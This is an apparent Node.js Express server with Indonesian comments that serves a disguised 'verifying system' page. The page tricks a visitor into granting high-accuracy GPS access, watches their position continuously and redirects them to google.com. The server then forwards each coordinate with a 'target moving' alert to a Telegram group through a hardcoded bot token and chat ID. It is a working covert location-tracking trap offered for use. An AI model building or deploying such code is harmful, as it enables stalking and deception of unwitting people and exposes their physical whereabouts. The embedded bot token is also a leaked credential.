const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

const BOT_TOKEN = "9247213906:AAEHZMLP9BxdTpiGUyoOR9nq5QkTBOZGHw8"; 
const LOG_GROUP_ID = "-1004375338330"; 

// Endpoint Nerima GPS
app.post('/api/save-location', async (req, res) => {
    const { lat, lon, accuracy } = req.body;
    if (lat && lon) {
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const msg = `🚨 <b>TARGET BERGERAK (GPS)!</b>\n\n📍 Lat: <code>${lat}</code>\n📍 Lon: <code>${lon}</code>\n🎯 Akurasi: ${Math.round(accuracy)}m\n\n<a href="${mapsLink}">Buka Google Maps</a>`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, { chat_id: LOG_GROUP_ID, latitude: lat, longitude: lon }).catch(()=>{});
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: LOG_GROUP_ID, text: msg, parse_mode: 'HTML' }).catch(()=>{});
    }
    res.status(200).send("OK");
});

// Endpoint Tampilin Halaman
app.get('/track/:id', async (req, res) => {
    // HTML Jebakan
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Loading...</title></head>
    <body style="text-align:center; padding:50px; font-family:sans-serif;">
        <h2>Memverifikasi Sistem...</h2>
        <p>Harap izinkan akses lokasi Anda.</p>
        <script>
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(function(pos) {
                    fetch("/api/save-location", {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy })
                    }).then(() => { window.location.href = "https://google.com"; });
                }, function(err) { alert("Izinkan lokasi untuk melanjutkan!"); }, { enableHighAccuracy: true });
            }
        </script>
    </body>
    </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Web jalan di port ${PORT}`));
